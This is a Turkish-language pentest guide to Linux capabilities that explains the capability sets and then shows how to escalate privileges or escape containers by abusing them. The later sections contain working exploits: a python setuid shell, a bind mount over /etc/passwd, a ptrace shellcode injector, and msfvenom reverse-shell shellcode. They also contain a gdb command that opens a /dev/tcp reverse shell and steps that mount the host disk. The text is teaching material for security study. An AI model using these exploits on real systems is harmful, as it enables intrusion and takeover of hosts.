# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities, **root ayrıcalıklarını daha küçük ve birbirinden bağımsız birimlere böler**; böylece process'lerin ayrıcalıkların bir alt kümesine sahip olmasını sağlar. Gereksiz yere tam root ayrıcalıkları vermeyerek riskleri minimize eder.

### Problem:

- Normal kullanıcıların izinleri sınırlıdır; bu durum root erişimi gerektiren bir network socket açma gibi görevleri etkiler.

### Capability Kümeleri:

1. **Inherited (CapInh)**:

- **Amaç**: Parent process'ten aktarılan capability'leri belirler.
- **İşlevsellik**: Yeni bir process oluşturulduğunda, bu kümede parent process'in sahip olduğu capability'leri miras alır. Process spawn'ları boyunca belirli ayrıcalıkları korumak için kullanışlıdır.
- **Kısıtlamalar**: Bir process, parent process'inin sahip olmadığı capability'leri kazanamaz.

2. **Effective (CapEff)**:

- **Amaç**: Bir process'in herhangi bir anda kullandığı gerçek capability'leri temsil eder.
- **İşlevsellik**: Çeşitli işlemler için izin vermek üzere kernel tarafından kontrol edilen capability kümesidir. Dosyalar için bu küme, dosyanın permitted capability'lerinin etkin olarak değerlendirilip değerlendirilmeyeceğini belirten bir flag olabilir.
- **Önemi**: Effective kümesi, bir process'in kullanabileceği aktif capability kümesi olarak anlık privilege kontrolleri için kritik öneme sahiptir.

3. **Permitted (CapPrm)**:

- **Amaç**: Bir process'in sahip olabileceği maksimum capability kümesini tanımlar.
- **İşlevsellik**: Bir process, bir capability'yi permitted kümesinden effective kümesine yükselterek bu capability'yi kullanma yeteneği kazanabilir. Ayrıca permitted kümesinden capability'leri bırakabilir.
- **Sınır**: Bir process'in sahip olabileceği capability'ler için üst sınır görevi görür ve process'in önceden tanımlanmış ayrıcalık kapsamını aşmamasını sağlar.

4. **Bounding (CapBnd)**:

- **Amaç**: Bir process'in yaşam döngüsü boyunca edinebileceği capability'ler için bir üst sınır koyar.
- **İşlevsellik**: Bir process'in inheritable veya permitted kümesinde belirli bir capability olsa bile, bu capability bounding kümesinde de bulunmadıkça onu edinemez.
- **Kullanım alanı**: Bu küme, bir process'in privilege escalation potansiyelini kısıtlamak ve ek bir security katmanı sağlamak için özellikle kullanışlıdır.

5. **Ambient (CapAmb)**:
- **Amaç**: Normalde process'in capability'lerinin tamamen sıfırlanmasına neden olan bir `execve` system call boyunca belirli capability'lerin korunmasını sağlar.
- **İşlevsellik**: İlişkili file capability'lere sahip olmayan non-SUID programların belirli ayrıcalıkları koruyabilmesini sağlar.
- **Kısıtlamalar**: Bu kümedeki capability'ler inheritable ve permitted kümelerinin kısıtlamalarına tabidir; böylece process'in izin verilen ayrıcalıklarını aşmamaları sağlanır.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Daha fazla bilgi için şunlara bakın:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Process ve Binary Capabilities

### Process Capabilities

Belirli bir process'in capabilities bilgilerini görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığından, bunu yalnızca Linux capabilities ile ilgili bilgilerle sınırlandıralım.\
Tüm çalışan process'ler için capability bilgilerinin thread başına tutulduğunu, file system'deki binary'ler için ise extended attributes içinde saklandığını unutmayın.

Tanımlı capabilities'leri /usr/include/linux/capability.h içinde bulabilirsiniz.

Mevcut process'in capabilities bilgilerini `cat /proc/self/status` ile veya `capsh --print` komutunu çalıştırarak, diğer kullanıcıların capabilities bilgilerini ise `/proc/<pid>/status` içinde bulabilirsiniz.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Bu komut çoğu sistemde 5 satır döndürmelidir.

- CapInh = Devralınan capabilities
- CapPrm = İzin verilen capabilities
- CapEff = Etkin capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Bu hexadecimal sayılar anlam ifade etmiyor. `capsh` utility'sini kullanarak bunları capability adlarına decode edebiliriz.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Şimdi `ping` tarafından kullanılan **capabilities**'leri kontrol edelim:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bu yöntem işe yarasa da başka ve daha kolay bir yol vardır. Çalışan bir process'in capabilities değerlerini görmek için **getpcaps** aracını ve ardından process ID'sini (PID) kullanmanız yeterlidir. Ayrıca process ID'lerinden oluşan bir liste de sağlayabilirsiniz.
```bash
getpcaps 1234
```
`tcpdump` binary'sine network sniffing yapabilmesi için yeterli capabilities (`cap_net_admin` ve `cap_net_raw`) verildikten sonra `tcpdump`'ın capabilities'ini burada kontrol edelim (_tcpdump 9562 numaralı process'te çalışıyor_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Gördüğünüz gibi, verilen capabilities bir binary'nin capabilities bilgilerini elde etmenin 2 yönteminden alınan sonuçlarla eşleşmektedir.\
_getpcaps_ aracı, belirli bir thread için kullanılabilir capabilities bilgilerini sorgulamak üzere **capget()** system call'unu kullanır. Daha fazla bilgi almak için bu system call'a yalnızca PID'nin sağlanması gerekir.

### Binary Capabilities

Binary'ler, çalıştırılırken kullanılabilecek capabilities'e sahip olabilir. Örneğin, `ping` binary'sini `cap_net_raw` capability'siyle bulmak oldukça yaygındır:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Şunu kullanarak **capabilities** içeren binary'leri arayabilirsiniz:
```bash
getcap -r / 2>/dev/null
```
### capsh ile capabilities kaldırma

\_ping* için CAP*NET_RAW capabilities değerlerini kaldırırsak ping aracı artık çalışmamalıdır.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ çıktısının yanı sıra, _tcpdump_ komutunun kendisi de bir hata vermelidir.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Hata, ping komutunun bir ICMP socket'i açmasına izin verilmediğini açıkça gösteriyor. Artık bunun beklendiği şekilde çalıştığından eminiz.

### Capabilities'leri Kaldırma

Bir binary'nin capabilities'lerini şu şekilde kaldırabilirsiniz:
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Görünüşe göre **capabilities kullanıcılara da atanabilir**. Bu muhtemelen kullanıcı tarafından çalıştırılan her process'in, kullanıcının capabilities değerlerini kullanabileceği anlamına gelir.\
[Bu](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [bu ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)ve [bu](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) kaynaklara göre, bir kullanıcıya belirli capabilities değerlerini vermek için yapılandırılması gereken birkaç yeni dosya vardır; ancak capabilities değerlerini her kullanıcıya atayan dosya `/etc/security/capability.conf` olacaktır.\
Dosya örneği:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Ortam Yetenekleri

Aşağıdaki programı derleyerek **capabilities sağlayan bir ortam içinde bash shell başlatmak** mümkündür.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**derlenmiş ambient binary tarafından çalıştırılan bash** içinde **yeni capabilities** gözlemlenebilir (normal bir kullanıcının "current" bölümünde herhangi bir capability'si bulunmaz).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Yalnızca hem izin verilen hem de devralınabilir setlerde **mevcut olan capabilities** ekleyebilirsiniz.

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries**, environment tarafından verilen yeni **capabilities**'leri kullanmaz; ancak **capability-dumb binaries**, bunları reddetmedikleri için kullanır. Bu durum, binary'lere capabilities sağlayan özel bir environment içindeki capability-dumb binaries'leri savunmasız hâle getirir.

## Service Capabilities

Varsayılan olarak, **root** olarak çalışan bir **service** tüm capabilities'lere atanır ve bazı durumlarda bu tehlikeli olabilir.\
Bu nedenle bir **service configuration** dosyası, sahip olmasını istediğiniz **capabilities**'leri ve gereksiz ayrıcalıklarla çalışan bir service'i önlemek için service'i çalıştırması gereken **user**'ı **belirtmenize** olanak tanır:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers'ta Capabilities

Docker varsayılan olarak container'lara birkaç capability atar. Bu capability'lerin hangileri olduğunu şu komutu çalıştırarak kolayca kontrol edebilirsiniz:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities, **ayrıcalıklı işlemleri gerçekleştirdikten sonra kendi process'lerinizi kısıtlamak istediğinizde** kullanışlıdır (ör. chroot yapılandırıp bir socket'e bind ettikten sonra). Ancak root olarak çalıştırılan bu process'lere malicious command veya argument'ler geçirilerek exploit edilebilirler.

`setcap` kullanarak programlara capabilities atayabilir, bunları `getcap` ile sorgulayabilirsiniz:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`, capability’yi Effective ve Permitted olarak eklediğiniz anlamına gelir (`-` ise kaldırır).

Bir sistemde veya klasörde capabilities bulunan programları belirlemek için:
```bash
getcap -r / 2>/dev/null
```
### Exploitation örneği

Aşağıdaki örnekte `/usr/bin/python2.6` binary'sinin privesc'e karşı savunmasız olduğu görülmektedir:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Herhangi bir kullanıcının paketleri sniff etmesine izin vermek** için `tcpdump` tarafından gereken **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities özel durumu

[Docs'tan](https://man7.org/linux/man-pages/man7/capabilities.7.html): Bir program dosyasına boş capability kümeleri atanabileceğini ve bu sayede, programı çalıştıran process'in effective ve saved set-user-ID değerlerini 0 olarak değiştiren, ancak bu process'e hiçbir capability vermeyen bir set-user-ID-root programı oluşturmanın mümkün olduğunu unutmayın. Veya basitçe ifade etmek gerekirse, aşağıdaki özelliklere sahip bir binary'niz varsa:

1. root tarafından sahip olunmuyor
2. `SUID`/`SGID` bitleri ayarlanmamış
3. boş capabilities kümesine sahip (örneğin: `getcap myelf`, `myelf =ep` döndürüyor)

o zaman **bu binary root olarak çalışır**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, cihazları mount etmek veya kernel özelliklerini değiştirmek gibi kapsamlı **administrative privileges** sağladığı için genellikle root'a yakın bir seviyeye eşdeğer kabul edilen, son derece güçlü bir Linux capability'sidir. Tüm sistemleri simüle eden container'lar için vazgeçilmez olsa da **`CAP_SYS_ADMIN`, privilege escalation ve sistemin ele geçirilmesi potansiyeli nedeniyle**, özellikle containerized ortamlarda **önemli güvenlik sorunları oluşturur**. Bu nedenle, **least privilege principle** ilkesine uymak ve attack surface'i en aza indirmek için, bu capability'nin kullanımı sıkı security assessment'lar ve dikkatli yönetim gerektirir; application-specific container'larda bu capability'nin kaldırılması özellikle tercih edilmelidir.

**binary ile örnek**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python kullanarak değiştirilmiş bir _passwd_ dosyasını gerçek _passwd_ dosyasının üzerine bağlayabilirsiniz:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Ve son olarak değiştirilmiş `passwd` dosyasını `/etc/passwd` üzerine **mount** edin:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Ve "password" parolasını kullanarak **root olarak `su`** çalıştırabileceksiniz.

**Environment ile örnek (Docker breakout)**

Aşağıdakini kullanarak Docker container içindeki etkin capabilities'leri kontrol edebilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda SYS_ADMIN capability’sinin etkin olduğunu görebilirsiniz.

- **Mount**

Bu, docker container’ın **host diskini mount etmesine ve diske serbestçe erişmesine** olanak tanır:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Tam erişim**

Önceki yöntemde docker host diskine erişmeyi başardık.\
Host üzerinde bir **ssh** server çalıştığını tespit ederseniz, **docker host** diskinde bir kullanıcı oluşturabilir ve SSH üzerinden erişebilirsiniz:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Bu, host içinde çalışan bazı process'lerin içine shellcode enjekte ederek container'dan escape edebileceğiniz anlamına gelir.** Host içinde çalışan process'lere erişmek için container'ın en azından **`--pid=host`** ile çalıştırılması gerekir.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan debugging ve system call tracing işlevlerini ve `process_vm_readv(2)` ile `process_vm_writev(2)` gibi cross-memory attach çağrılarını kullanma yeteneği verir. Diagnostic ve monitoring amaçları için güçlü olsa da `CAP_SYS_PTRACE`, `ptrace(2)` üzerinde seccomp filter gibi kısıtlayıcı önlemler olmadan etkinleştirildiğinde sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, [buradaki proofs of concept (PoC) örneğinde](https://gist.github.com/thejh/8346f47e359adecd1d53) gösterildiği gibi, seccomp tarafından uygulananlar başta olmak üzere diğer security restriction'ları aşmak için exploit edilebilir.

**binary ile örnek (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Binary ile örnek (gdb)**

`ptrace` yeteneğine sahip `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
gdb aracılığıyla belleğe enjekte etmek için msfvenom ile bir shellcode oluşturun
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Bir root process'ini gdb ile debug edin ve daha önce oluşturulan gdb satırlarını kopyalayıp yapıştırın:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Example with environment (Docker breakout) - Another gdb Abuse**

**GDB** kuruluysa (örneğin `apk add gdb` veya `apt install gdb` ile kurabiliyorsanız), **host üzerinden bir process'i debug edebilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` capability'sini de gerektirir)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Komutun çıktısını göremeyeceksiniz, ancak komut ilgili process tarafından çalıştırılacak (bu nedenle bir rev shell alın).

> [!WARNING]
> "No symbol "system" in current context." hatasını alırsanız, gdb aracılığıyla bir programa shellcode yüklemeyle ilgili önceki örneği kontrol edin.

**Environment ile örnek (Docker breakout) - Shellcode Injection**

Docker container içindeki etkin capabilities değerlerini şu komutu kullanarak kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host** üzerinde çalışan **process**'leri listeleyin `ps -eaf`

1. **architecture**'ı öğrenin `uname -m`
2. **architecture** için bir **shellcode** bulun ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**'u bir process'in belleğine **inject** etmek için bir **program** bulun ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. Program içindeki **shellcode**'u **değiştirin** ve derleyin `gcc inject.c -o inject`
5. **Inject** edin ve **shell**'inizi alın: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir process'e **kernel modüllerini (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` system call'ları) yükleme ve kaldırma** yetkisi verir ve kernel'in temel işlemlerine doğrudan erişim sağlar. Bu capability, kernel üzerinde değişiklik yapılmasına olanak tanıyarak Linux Security Modules ve container isolation dahil olmak üzere tüm Linux security mekanizmalarını bypass etmeyi mümkün kıldığından, kritik security riskleri oluşturur.
**Bu, host makinesinin kernel'ine kernel modülleri ekleyebileceğiniz/kaldırabileceğiniz anlamına gelir.**

**binary ile örnek**

Aşağıdaki örnekte **`python`** binary'si bu capability'ye sahiptir.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Varsayılan olarak, **`modprobe`** komutu bağımlılık listesi ve map dosyalarını **`/lib/modules/$(uname -r)`** dizininde arar.\
Bundan faydalanmak için sahte bir **lib/modules** klasörü oluşturalım:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Ardından **aşağıda bulabileceğiniz 2 kernel module örneğini derleyin ve bu klasöre kopyalayın**:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Son olarak, bu kernel module'u yüklemek için gereken python kodunu çalıştırın:
```python
import kmod
km = kmod.Kmod()
